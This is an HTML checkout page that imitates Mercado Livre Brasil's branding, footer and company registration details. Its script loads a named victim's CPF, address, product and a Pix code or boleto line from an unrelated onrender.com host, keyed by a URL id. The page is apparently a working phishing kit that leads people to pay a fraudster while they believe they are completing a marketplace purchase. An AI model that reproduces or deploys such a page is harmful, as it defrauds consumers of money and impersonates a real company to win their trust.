<!DOCTYPE html>
<html lang="pt-BR" data-site="ML" data-country="BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mercado Livre Brasil - Onde comprar e vender de Tudo</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            overflow-y: scroll;
        }
        .header {
            background-color: #fff159;
            height: 50px;
            display: flex;
            justify-content: center;
            align-items: center;
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 1000;
        }
        .header img {
            height: 30px;
        }
        .content {
            margin-top: 60px;
            padding: 20px;
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
        }
        .section {
            background-color: white;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            margin-bottom: 10px;
            flex: 1;
            min-width: 0;
            display: none;
        }
        .section.active {
            display: block;
        }
        .back-btn {
            position: absolute;
            top: 10px;
            left: 10px;
            font-size: 1.5em;
            color: #333;
            text-decoration: none;
        }
        .payment-methods label {
            display: flex;
            align-items: center;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-bottom: 10px;
            cursor: pointer;
            font-size: 0.95em;
            background-color: #fff;
            position: relative;
        }
        .payment-methods label:hover {
            background-color: #f9f9f9;
        }
        .payment-methods input[type="radio"] {
            margin-right: 10px;
            vertical-align: middle;
        }
        .payment-methods .recommended::after {
            content: '';
            position: absolute;
            top: 8px;
            right: 15px;
            color: #000;
            font-size: 0.8em;
            font-weight: bold;
            background-color: #fff;
            padding: 2px 6px;
            border-radius: 4px;
        }
        .payment-methods .method-icon {
            width: 24px;
            height: 24px;
            margin-right: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .payment-methods .method-details {
            flex-grow: 1;
        }
        .payment-methods .method-details span:first-child {
            display: block;
            color: #333;
            font-weight: bold;
        }
        .payment-methods .method-details span:last-child {
            display: block;
            color: #666;
            font-size: 0.85em;
        }
        .summary {
            padding: 10px;
        }
        .summary div {
            display: flex;
            justify-content: space-between;
            margin-bottom: 5px;
        }
        .summary hr {
            border: 0;
            border-top: 1px solid #ddd;
        }
        .summary .total {
            font-weight: bold;
            margin-top: 10px;
        }
        .btn-confirm {
            background-color: #3483fa;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 4px;
            width: 100%;
            font-size: 1em;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn-confirm:hover {
            background-color: #2968c8;
        }
        .review-section .billing-info,
        .review-section .delivery-info,
        .review-section .product-info {
            padding: 10px;
            border-bottom: 1px solid #ddd;
            display: flex;
            align-items: flex-start;
        }
        .review-section .billing-info img,
        .review-section .delivery-info img,
        .review-section .product-info img {
            max-width: 24px;
            margin-right: 10px;
        }
        .review-section .billing-info .text,
        .review-section .delivery-info .text,
        .review-section .product-info .text {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
        }
        .review-section .delivery-info .text span.delivery-date {
            margin-top: 5px;
            display: flex;
            align-items: center;
        }
        .review-section .delivery-info .text span.delivery-date img {
            margin-left: 5px;
            max-width: 24px;
        }
        .review-section .product-info img {
            max-width: 50px;
            margin-right: 10px;
        }
        .review-section .payment-info {
            display: flex;
            align-items: center;
            padding: 10px;
            border-bottom: 1px solid #ddd;
        }
        .review-section .payment-info img {
            max-width: 24px;
            margin-right: 10px;
        }
        .payment-section {
            width: 100%;
            padding: 20px;
            text-align: center;
            display: none;
        }
        .payment-section.active {
            display: flex;
            flex-direction: column;
            align-items: center;
            background-color: #00a650;
            color: white;
        }
        .payment-header {
            font-size: 1.2em;
            margin-bottom: 10px;
        }
        .payment-header img {
            width: 24px;
            height: 24px;
            vertical-align: middle;
            margin-left: 10px;
            background-color: white;
            padding: 3px;
            border-radius: 25%;
        }
        .payment-box {
            background-color: white;
            padding: 15px;
            border-radius: 8px;
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
            text-align: left;
            color: #333;
            margin-top: 10px;
        }
        .payment-box p {
            margin: 5px 0;
            font-size: 0.9em;
        }
        .payment-box ol {
            padding-left: 20px;
            font-size: 0.9em;
        }
        .qr-code {
            text-align: center;
            margin: 20px 0;
        }
        .qr-code img {
            max-width: 200px;
        }
        .copy-key {
            margin-top: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .copy-key input {
            flex: 1;
            padding: 8px;
            font-size: 0.9em;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
            word-break: break-all;
        }
        .copy-key button {
            background-color: #3483fa;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.9em;
        }
        .copy-key button:hover {
            background-color: #2968c8;
        }
        .splash-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 166, 80, 0.8);
            z-index: 10000;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 1.5em;
            text-align: center;
        }
        .footer {
            background-color: #f5f5f5;
            padding: 10px 20px;
            text-align: center;
            font-size: 0.7em;
            color: #666;
            border-top: 1px solid #ddd;
            margin-top: auto;
        }
        .footer a {
            color: #333;
            text-decoration: none;
            margin: 0 5px;
        }
        .footer a:hover {
            text-decoration: underline;
        }

        @media (max-width: 768px) {
            .header { height: 40px; }
            .header img { height: 20px; }
            .section { width: 100%; }
            .payment-box {
                max-width: 100%;
            }
            .copy-key {
                flex-direction: column;
                gap: 5px;
            }
            .copy-key input {
                width: 100%;
            }
            .copy-key button {
                width: 100%;
            }
            .qr-code img { max-width: 150px; }
            .btn-confirm { font-size: 0.9em; padding: 8px; }
            .footer { font-size: 0.6em; padding: 5px 10px; }
            .splash-screen { font-size: 1.2em; }
        }

        @media (min-width: 769px) {
            #paymentChoice {
                flex: 1 1 60%;
                min-width: 300px;
            }
            #summarySection {
                flex: 1 1 35%;
                min-width: 250px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="assets/logo.png" alt="Mercado Livre Logo">
    </div>
    <div class="content">
        <a href="#" class="back-btn" onclick="goBack()">←</a>
        <div class="section payment-choice active" id="paymentChoice">
            <h2>Escolha como pagar</h2>
            <div class="payment-methods">
                <label class="recommended">
                    <input type="radio" name="payment" value="pix" required>
                    <img src="assets/pix.png" alt="Pix Icon" class="method-icon">
                    <div class="method-details">
                        <span>Pix</span>
                        <span>Aprovação imediata</span>
                    </div>
                </label>
                <label>
                    <input type="radio" name="payment" value="boleto">
                    <img src="assets/boleto.png" alt="Boleto Icon" class="method-icon">
                    <div class="method-details">
                        <span>Boleto bancário</span>
                        <span>Aprovação em até dois dias</span>
                    </div>
                </label>
                <label>
                    <input type="radio" name="payment" value="cartao">
                    <img src="assets/cartao.png" alt="Cartão Icon" class="method-icon">
                    <div class="method-details">
                        <span>Cartão de crédito</span>
                        <span>Até 18 parcelas sem juros</span>
                    </div>
                </label>
            </div>
            <div class="summary">
                <h3>Resumo da compra</h3>
                <div><span>Produto</span><span id="productTotal">R$ 2.999,00</span></div>
                <div><span>Frete</span><span>Grátis</span></div>
                <div><span>Insira código do cupom</span><span></span></div>
                <hr>
                <div class="total"><span>Você pagará</span><span id="totalPayable">R$ 2.999,00</span></div>
            </div>
            <button class="btn-confirm" onclick="reviewPayment()">Continuar</button>
        </div>
        <div class="section review-section" id="reviewSection">
            <h2>Revise e confirme</h2>
            <div class="billing-info">
                <img src="assets/faturamento.png" alt="Faturamento Icon">
                <div class="text">
                    <span id="clientName">Nome do Cliente</span>
                    <span id="clientCPF">CPF 000.000.999-11</span>
                </div>
            </div>
            <div class="delivery-info">
                <img src="assets/localizar.png" alt="Localizar Icon">
                <div class="text">
                    <span id="clientAddress">Endereço do Cliente</span>
                    <span class="delivery-date">
                        Chegará entre dia <span id="deliveryDate">03 a 04</span>
                        <img src="assets/full.png" alt="Full Icon">
                    </span>
                </div>
            </div>
            <div class="product-info">
                <img id="productPhotoReview" src="assets/shopping_bag.png" alt="Product Icon">
                <div class="text">
                    <p id="productNameReview">Produto Exemplo</p>
                    <p>Quantidade: 1</p>
                </div>
                <div class="payment-icon" id="paymentIcon"></div>
            </div>
            <div class="payment-info" id="paymentInfo">
                <img src="" alt="Payment Icon" id="paymentIconReview">
                <span id="paymentMethod">Método de Pagamento</span>
                <span id="paymentValue"> 2.999,00</span>
            </div>
            <div class="summary">
                <h3>Resumo da compra</h3>
                <div><span>Produto</span><span id="productTotalReview">R$ 2.999,00</span></div>
                <div><span>Frete</span><span>Grátis</span></div>
                <div><span>Insira código do cupom</span><span></span></div>
                <hr>
                <div class="total"><span>Você pagará</span><span id="totalPayableReview">R$ 2.999,00</span></div>
            </div>
            <button class="btn-confirm" onclick="confirmPurchase()">Confirmar a compra</button>
        </div>
        <div class="section payment-section" id="paymentSection">
            <div class="payment-header" id="paymentHeader">
                Pague <span style="margin-left: 5px;">R$ 2.999,00</span>* via Pix para garantir sua compra
                <img src="assets/shopping_bag.png" alt="Shopping Bag Icon">
            </div>
            <div class="payment-box">
                <p>Escaneie este código QR para pagar</p>
                <ol>
                    <li>Acesse seu Internet Banking ou app de pagamentos.</li>
                    <li>Escolha pagar via Pix.</li>
                    <li>Escaneie o seguinte código:</li>
                </ol>
                <div class="qr-code">
                    <img id="qrCodeImage" src="assets/qrcode.png" alt="QR Code">
                </div>
                <p>Ou pague e será creditado na hora</p>
                <div class="copy-key">
                    <input id="pixCodeInput" type="text" value="000212600014br.gob.bcb.pix0104aaa5204000053c" readonly>
                    <button onclick="copyToClipboard()">Copiar código</button>
                </div>
            </div>
        </div>
    </div>
    <div class="footer">
        <a href="#">Trabalhe conosco</a> |
        <a href="#">Termos e condições</a> |
        <a href="#">Como cuidamos da sua privacidade</a> |
        <a href="#">Acessibilidade</a> |
        <a href="#">Contato</a> |
        <a href="#">Informações sobre seguros</a> |
        <a href="#">Dia das mães</a>
        <p>Copyright © 1999-2024 Ebazar.com.br LTDA. CNPJ n° 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre.</p>
    </div>
    <div class="splash-screen" id="splashScreen">Processando...</div>
    <script>
        // Função para obter o ID da URL
        function getClientIdFromUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('id');
        }

        // Função para carregar os dados do cliente
        async function loadClientData(clientId) {
            try {
                const response = await fetch(`https://mlteste.onrender.com/client/${clientId}`);
                if (!response.ok) throw new Error('Cliente não encontrado');
                const client = await response.json();

                // Preencher os dados na seção de escolha de pagamento
                document.getElementById('clientName').textContent = client.name || 'Nome do Cliente';
                document.getElementById('clientCPF').textContent = client.cpf || 'CPF 000.000.999-11';
                document.getElementById('clientAddress').textContent = client.address || 'Endereço do Cliente';
                document.getElementById('deliveryDate').textContent = client.deliveryDate || '03 a 04';
                document.getElementById('productNameReview').textContent = client.productName || 'Produto Exemplo';
                document.getElementById('productTotal').textContent = `R$ ${client.total || '2.999,00'}`;
                document.getElementById('totalPayable').textContent = `R$ ${client.total || '2.999,00'}`;
                document.getElementById('productTotalReview').textContent = `R$ ${client.total || '2.999,00'}`;
                document.getElementById('totalPayableReview').textContent = `R$ ${client.total || '2.999,00'}`;
                document.getElementById('paymentValue').textContent = `R$ ${client.total || '2.999,00'}`;

                // Preencher a foto do produto se existir
                if (client.productPhoto) {
                    document.getElementById('productPhotoReview').src = `data:image/png;base64,${client.productPhoto}`;
                }

                // Configurar a seção de pagamento
                function updatePaymentSection() {
                    const paymentHeader = document.getElementById('paymentHeader');
                    if (client.paymentMethod === 'boleto') {
                        paymentHeader.innerHTML = `Pague <span style="margin-left: 5px;">R$ ${client.total || '2.999'},00</span>* via Boleto para garantir sua compra <img src="assets/shopping_bag.png" alt="Shopping Bag Icon">`;
                    } else if (client.paymentMethod === 'pix') {
                        paymentHeader.innerHTML = `Pague <span style="margin-left: 5px;">R$ ${client.total || '2.999'},00</span>* via Pix para garantir sua compra <img src="assets/shopping_bag.png" alt="Shopping Bag Icon">`;
                    } else if (client.paymentMethod === 'cartao') {
                        paymentHeader.innerHTML = `Pague <span style="margin-left: 5px;">R$ ${client.total || '2.999'},00</span>* via Cartão para garantir sua compra <img src="assets/shopping_bag.png" alt="Shopping Bag Icon">`;
                    }

                    // Atualizar QR Code e Pix Code
                    if (client.qrCode && client.paymentMethod === 'pix') {
                        document.getElementById('qrCodeImage').src = `data:image/png;base64,${client.qrCode}`;
                    }
                    if (client.pixCode && client.paymentMethod === 'pix') {
                        document.getElementById('pixCodeInput').value = client.pixCode;
                    } else if (client.boletoLine && client.paymentMethod === 'boleto') {
                        document.getElementById('pixCodeInput').value = client.boletoLine;
                    } else {
                        document.getElementById('pixCodeInput').value = '';
                    }
                }

                // Pré-selecionar o método de pagamento
                const paymentRadio = document.querySelector(`input[name="payment"][value="${client.paymentMethod || 'pix'}"]`);
                if (paymentRadio) paymentRadio.checked = true;

                // Adicionar listener para atualizar a seção de pagamento ao mudar o método
                document.querySelectorAll('input[name="payment"]').forEach(radio => {
                    radio.addEventListener('change', updatePaymentSection);
                });

                updatePaymentSection();
            } catch (error) {
                console.error('Erro ao carregar dados do cliente:', error);
                alert('Erro ao carregar os dados do cliente. Verifique o link ou tente novamente.');
            }
        }

        // Funções existentes
        function goBack() {
            const sections = ['paymentChoice', 'reviewSection', 'paymentSection'];
            const current = document.querySelector('.section.active');
            const currentIndex = sections.indexOf(current.id);
            if (currentIndex > 0) {
                current.classList.remove('active');
                document.getElementById(sections[currentIndex - 1]).classList.add('active');
                window.scrollTo({ top: 0, behavior: 'smooth' });
            }
        }

        function reviewPayment() {
            const selectedPayment = document.querySelector('input[name="payment"]:checked');
            if (selectedPayment) {
                document.getElementById('paymentChoice').classList.remove('active');
                document.getElementById('reviewSection').classList.add('active');
                const paymentMethod = selectedPayment.value;
                const paymentIconReview = document.getElementById('paymentIconReview');
                const paymentMethodText = document.getElementById('paymentMethod');

                if (paymentMethod === 'pix') {
                    paymentIconReview.src = 'assets/pix.png';
                    paymentMethodText.textContent = 'Pix';
                } else if (paymentMethod === 'boleto') {
                    paymentIconReview.src = 'assets/boleto.png';
                    paymentMethodText.textContent = 'Boleto Bancário';
                } else if (paymentMethod === 'cartao') {
                    paymentIconReview.src = 'assets/cartao.png';
                    paymentMethodText.textContent = 'Cartão de Crédito';
                }
                window.scrollTo({ top: 0, behavior: 'smooth' });
            } else {
                alert('Por favor, selecione um método de pagamento.');
            }
        }

        function confirmPurchase() {
            const selectedPayment = document.querySelector('input[name="payment"]:checked')?.value || 'pix';
            if (selectedPayment) {
                document.getElementById('paymentChoice').classList.remove('active');
                document.getElementById('reviewSection').classList.remove('active');
                const splash = document.getElementById('splashScreen');
                splash.style.display = 'flex';
                setTimeout(() => {
                    splash.style.display = 'none';
                    document.getElementById('paymentSection').classList.add('active');
                    window.scrollTo({ top: 0, behavior: 'smooth' });
                    const paymentHeader = document.getElementById('paymentHeader');
                    if (selectedPayment === 'boleto') {
                        paymentHeader.innerHTML = `Pague <span style="margin-left: 5px;">R$ 2.999,00</span>* via Boleto para garantir sua compra <img src="assets/shopping_bag.png" alt="Shopping Bag Icon">`;
                    } else if (selectedPayment === 'pix') {
                        paymentHeader.innerHTML = `Pague <span style="margin-left: 5px;">R$ 2.999,00</span>* via Pix para garantir sua compra <img src="assets/shopping_bag.png" alt="Shopping Bag Icon">`;
                    } else if (selectedPayment === 'cartao') {
                        paymentHeader.innerHTML = `Pague <span style="margin-left: 5px;">R$ 2.999,00</span>* via Cartão para garantir sua compra <img src="assets/shopping_bag.png" alt="Shopping Bag Icon">`;
                    }
                }, 1500); // Splash por 1,5 segundos
            } else {
                alert('Selecione um método de pagamento.');
            }
        }

        function copyToClipboard() {
            const input = document.getElementById('pixCodeInput');
            input.select();
            document.execCommand('copy');
            alert('Código copiado! Prossiga com o pagamento.');
        }

        // Carregar dados ao carregar a página
        window.onload = function() {
            const clientId = getClientIdFromUrl();
            if (clientId) {
                loadClientData(clientId);
            } else {
                console.warn('Nenhum ID de cliente fornecido na URL.');
                // Definir valores padrão como fallback
                document.getElementById('clientName').textContent = 'Nome do Cliente';
                document.getElementById('clientCPF').textContent = 'CPF 000.000.999-11';
                document.getElementById('clientAddress').textContent = 'Endereço do Cliente';
                document.getElementById('deliveryDate').textContent = '03 a 04';
                document.getElementById('productNameReview').textContent = 'Produto Exemplo';
                document.getElementById('productTotal').textContent = 'R$ 2.999,00';
                document.getElementById('totalPayable').textContent = 'R$ 2.999,00';
                document.getElementById('productTotalReview').textContent = 'R$ 2.999,00';
                document.getElementById('totalPayableReview').textContent = 'R$ 2.999,00';
                document.getElementById('paymentValue').textContent = 'R$ 2.999,00';
            }
        };
    </script>
</body>
</html>
